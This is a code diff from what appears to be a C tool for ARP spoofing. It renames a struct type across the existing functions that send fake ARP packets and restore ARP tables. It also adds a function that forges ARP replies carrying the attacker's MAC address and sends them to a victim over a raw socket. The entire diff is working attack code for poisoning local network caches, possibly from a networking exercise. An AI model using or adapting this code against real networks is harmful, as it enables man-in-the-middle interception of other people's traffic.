@@ -34,7 +34,7 @@ static void init_ether_frame(ethernet_frame* frame, const void* dest_addr, const
   memcpy(frame->data, payload, len_pld);
 }
 
-static void init_dest_sock(struct sockaddr_ll* dest, const t_malcom* mal) {
+static void init_dest_sock(struct sockaddr_ll* dest, const t_malcolm* mal) {
   memset(dest, 0, sizeof(*dest));
   dest->sll_family = AF_PACKET;
   dest->sll_protocol = htons(ETH_P_ARP);
@@ -44,7 +44,7 @@ static void init_dest_sock(struct sockaddr_ll* dest, const t_malcom* mal) {
   dest->sll_pkttype = PACKET_OTHERHOST;
 }
 
-void send_fake_arp_packet(const t_malcom* mal, const uint32_t target) {
+void send_fake_arp_packet(const t_malcolm* mal, const uint32_t target) {
   t_packet packet;
   ethernet_frame frame;
   struct sockaddr_ll dest = {0};
@@ -62,7 +62,7 @@ void send_fake_arp_packet(const t_malcom* mal, const uint32_t target) {
     error("sendto", NULL, __FILE__, __LINE__, __func__);
 }
 
-void restore_arp_tables(const t_malcom* mal, const uint32_t target) {
+void restore_arp_tables(const t_malcolm* mal, const uint32_t target) {
   t_packet packet;
   ethernet_frame frame;
   struct sockaddr_ll dest = {0};
@@ -81,4 +81,22 @@ void restore_arp_tables(const t_malcom* mal, const uint32_t target) {
   if (byte_send == -1)
     error("sendto", NULL, __FILE__, __LINE__, __func__);
   dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, target == 1 ? mal->mac_target : mal->mac_src);
+}
+
+void spoof_back_request(const t_malcolm* malcolm, const ethernet_frame* eth_frame) {
+  t_packet packet;
+  ethernet_frame frame;
+  struct sockaddr_ll dest = {0};
+
+  dprintf(1, "Preparing spoofing response...\n");
+  base_init_packet(&packet);
+  fill_field_packet(&packet, (const uint8_t*)malcolm->ifr.ifr_hwaddr.sa_data, malcolm->ip_target, eth_frame->src_addr, eth_frame->data + 8);
+  init_ether_frame(&frame, eth_frame->src_addr, (const uint8_t*)malcolm->ifr.ifr_hwaddr.sa_data, &packet, sizeof(packet));
+  init_dest_sock(&dest, malcolm);
+  dprintf(1, "Launching respongse...\n");
+  const ssize_t byte_send = sendto(malcolm->sock, &frame, sizeof(frame), 0, (struct sockaddr *)&dest, sizeof(dest));
+  if (byte_send == -1)
+    error("sendto", NULL, __FILE__, __LINE__, __func__);
+  if (byte_send == sizeof(frame))
+    dprintf(1, "Target hit by repsonse !\n");
 }
